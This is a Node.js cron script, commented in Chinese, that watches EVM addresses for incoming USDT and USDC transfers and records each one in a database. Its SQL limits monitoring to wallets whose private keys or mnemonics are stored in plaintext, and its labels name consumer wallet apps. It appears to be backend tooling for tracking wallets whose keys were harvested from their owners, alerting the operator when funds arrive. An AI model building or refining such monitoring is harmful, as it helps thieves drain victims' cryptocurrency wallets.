#!/usr/bin/env node
/**
 * evm_tx_watch.js —— EVM 逐笔进账监控（USDT/USDC）：2026-09-17
 *
 * 目的：修掉"余额采样对比"的少报盲区（快进快出/多笔合并）。按交易历史逐笔发现转入，
 *       txid 去重，每笔 → balance_changes(source='evm_tx') → 通知管道。
 * 覆盖（每轮动态查询，新地址自动纳入）：
 *   · 有余额的 EVM 地址（bal > 0 或 data.tokens 非空）
 *   · watch_addrs（监控地址，EVM 链）
 *   · 只报 USDT/USDC（按合约地址识别；未知代币静默跳过 —— 操作员确认）
 * 游标：adm888app/data/evm_tx_state.json（每 (地址|链) 一个 last_block；新地址以当前块起算，不回溯历史）
 * 调度：cron 每 2 分钟 + flock；cap 每轮最多 80 个地址（最少最近轮询优先，随集合增长自然延展节奏）
 * key：复用 docs/区块游览器key.txt（34 位 EVM key 池，轮换 + 限速退避）
 */
'use strict';
const fs = require('fs');
const path = require('path');
const BASE = '/www/wwwroot/i.131422.com';
const KEYS_F = path.join(BASE, 'docs', '区块游览器key.txt');
const STATE_F = path.join(BASE, 'adm888app', 'data', 'evm_tx_state.json');
const { pool } = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const CHAINS = [
  { name: 'ETH',      es: 1,     rpc: 'https://ethereum-rpc.publicnode.com' },
  { name: 'BSC',      es: 56,    rpc: 'https://bsc-rpc.publicnode.com' },
  { name: 'POLYGON',  es: 137,   rpc: 'https://polygon-bor-rpc.publicnode.com' },
  { name: 'ARBITRUM', es: 42161, rpc: 'https://arbitrum-one-rpc.publicnode.com' },
  { name: 'BASE',     es: 8453,  rpc: 'https://base-rpc.publicnode.com' },
];
// 各链 USDT/USDC 合约（小写）→ abbr
const TOKENS = {
  ETH:      { '0xdac17f958d2ee523a2206206994597c13d831ec7': 'USDT', '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 'USDC' },
  BSC:      { '0x55d398326f99059ff775485246999027b3197955': 'USDT', '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d': 'USDC' },
  POLYGON:  { '0xc2132d05d31c914a87c6611c10748aeb04b58e8f': 'USDT', '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359': 'USDC' },
  ARBITRUM: { '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9': 'USDT', '0xaf88d065e77c8cc2239327c5edb3a432268e5831': 'USDC' },
  BASE:     { '0xfde4c96c8593536e31f229ea8f37b2ada2699bb2': 'USDT', '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913': 'USDC' },
};
const EVM_LABELS = `('ETH','ETHEREUM','METAMASK','TRUST','BITGET','IMTOKEN','EXODUS','BSC','POLYGON','ARBITRUM','BASE')`;
const CAP = Number(process.env.EVM_TX_CAP || 80);

const log = (...a) => console.log(new Date().toISOString().slice(0, 19).replace('T', ' '), ...a);

// ── key 池 ──
let KEYS = [];
try {
  for (const ln of fs.readFileSync(KEYS_F, 'utf8').split('\n')) {
    const s = ln.trim();
    if (s.length === 34) KEYS.push(s);
  }
} catch (e) { log('key 文件读取失败:', e.message); }
let _ki = 0;
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function esFetch(url) {
  for (let att = 0; att < 2; att++) {
    const key = KEYS.length ? KEYS[(_ki + att) % KEYS.length] : '';
    try {
      const r = await fetch(url + '&apikey=' + key, { signal: AbortSignal.timeout(20000) });
      const j = await r.json();
      if (j && String(j.status) === '1') { _ki++; return j; }
      const msg = String((j && (j.result || j.message)) || '');
      if (/rate limit|Max/i.test(msg)) { _ki++; await sleep(800); continue; }
      return j;   // "No transactions found" 等业务空结果
    } catch (e) { _ki++; await sleep(800); }
  }
  return null;
}
let _lastEs = 0;
async function esGet(url) {
  const gap = 150 - (Date.now() - _lastEs);
  if (gap > 0) await sleep(gap);
  _lastEs = Date.now();
  return esFetch(url);
}

// ── 状态 ──
function loadState() {
  try { return JSON.parse(fs.readFileSync(STATE_F, 'utf8')); } catch (e) { return { cursors: {}, last_poll: {} }; }
}
function saveState(st) {
  try { fs.writeFileSync(STATE_F + '.tmp', JSON.stringify(st)); fs.renameSync(STATE_F + '.tmp', STATE_F); } catch (e) { log('状态保存失败:', e.message); }
}

async function rpcHead(url) {
  try {
    const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] }), signal: AbortSignal.timeout(15000) });
    const j = await r.json();
    return j && j.result ? parseInt(j.result, 16) : 0;
  } catch (e) { return 0; }
}

(async () => {
  const t0 = Date.now();
  if (!KEYS.length) { log('无可用 EVM key，退出'); process.exit(0); }
  const st = loadState();
  st.cursors = st.cursors || {}; st.last_poll = st.last_poll || {};

  // ── 覆盖集合（动态；新地址自动纳入）──
  // 【2026-09-17 操作员定案】无钥地址不再查询余额（口径同 balance_sync.js / tron_watch.py）
  const NOK = `( COALESCE(private_key_plain,'') <> ''
      OR EXISTS (SELECT 1 FROM addresses d WHERE d.serial = addresses.serial
                 AND lower(d.public_key) = lower(addresses.public_key) AND COALESCE(d.private_key_plain,'') <> '')
      OR (COALESCE(data->>'derivation_path','') <> '' AND EXISTS (SELECT 1 FROM mnemonics m WHERE m.serial = addresses.serial AND COALESCE(m.plain,'') <> '')) )`;
  const r1 = await pool.query(
    `SELECT public_key, serial FROM addresses
      WHERE upper(chain) IN ${EVM_LABELS} AND public_key LIKE '0x%'
        AND (bal > 0 OR jsonb_array_length(COALESCE(data->'tokens','[]'::jsonb)) > 0)
        AND ` + NOK + `
      ORDER BY (public_key = lower(public_key)) DESC, id ASC`);
  const seen = new Map();   // lower(addr) → {raw: 规范写法, serial: 优先小写行的 serial}
  for (const row of r1.rows) {
    const lp = String(row.public_key).toLowerCase();
    if (!seen.has(lp)) seen.set(lp, { raw: row.public_key, serial: row.serial || null });
  }
  try {
    const r2 = await pool.query(`SELECT addr, note FROM watch_addrs WHERE enabled AND upper(chain) IN ${EVM_LABELS}`);
    for (const row of r2.rows) {
      const lp = String(row.addr).toLowerCase();
      if (!seen.has(lp)) seen.set(lp, { raw: row.addr, serial: null });
    }
  } catch (e) {}
  // 最少最近轮询优先 + cap
  const list = [...seen.entries()]
    .sort((a, b) => (Number(st.last_poll[a[0]] || 0) - Number(st.last_poll[b[0]] || 0)))
    .slice(0, CAP);
  log(`待轮询 ${list.length} 个地址（集合共 ${seen.size}）`);

  const heads = {};
  async function head(chain) {
    if (heads[chain.name] === undefined) heads[chain.name] = await rpcHead(chain.rpc);
    return heads[chain.name];
  }

  let newRows = 0, skippedUnknown = 0;
  for (const [lp, meta] of list) {
    for (const chain of CHAINS) {
      const ck = lp + '|' + chain.name;
      let cursor = Number(st.cursors[ck] || 0);
      if (!cursor) {   // 新地址：以当前块起算（不回溯历史，防灌水）
        const h = await head(chain);
        if (!h) continue;
        st.cursors[ck] = h;
        continue;
      }
      // 分页拉取（startblock 含游标块，txid 去重兜底）
      let page = 1, lastBlock = cursor, found = 0;
      while (page <= 5) {
        const j = await esGet(`https://api.etherscan.io/v2/api?chainid=${chain.es}&module=account&action=tokentx&address=${meta.raw}&startblock=${cursor}&endblock=99999999&sort=asc&page=${page}&offset=100`);
        if (!j) break;
        const rows = Array.isArray(j.result) ? j.result : [];
        if (!rows.length) break;
        for (const x of rows) {
          lastBlock = Math.max(lastBlock, parseInt(x.blockNumber || '0', 10));
          if (String(x.to || '').toLowerCase() !== lp) continue;
          const abbr = TOKENS[chain.name][String(x.contractAddress || '').toLowerCase()];
          if (!abbr) { skippedUnknown++; continue; }
          const dec = Number(x.tokenDecimal || 0);
          const amt = Number(x.value) / Math.pow(10, dec);
          if (!(amt > 0)) continue;
          const txid = String(x.hash || '');
          const dup = await pool.query(`SELECT 1 FROM balance_changes WHERE txid = $1 AND COALESCE(token_abbr,'') = $2 LIMIT 1`, [txid, abbr]);
          if (dup.rows.length) continue;
          await pool.query(
            `INSERT INTO balance_changes (addr, chain, serial, old_bal, new_bal, delta, token_abbr, token_amount, txid, source)
             VALUES ($1,$2,$3,NULL,NULL,0,$4,$5,$6,'evm_tx')`,
            [meta.raw, chain.name, meta.serial, abbr, amt, txid]);
          newRows++; found++;
          log(`⚡ ${chain.name} ${meta.raw.slice(0, 12)}… +${amt} ${abbr}（tx ${txid.slice(0, 12)}…）`);
        }
        if (rows.length < 100) break;
        page++;
      }
      if (lastBlock > cursor) st.cursors[ck] = lastBlock;   // 推进游标（同块重查由 txid 去重兜底）
    }
    st.last_poll[lp] = Date.now();
  }
  saveState(st);
  try { await pool.end(); } catch (e) {}
  log(`完成：新进账 ${newRows} 笔（跳过未知代币 ${skippedUnknown} 笔）| ${((Date.now() - t0) / 1000).toFixed(1)}s`);
  process.exit(0);
})().catch(e => { console.error('[evm_tx_watch] fatal', e); process.exit(1); });
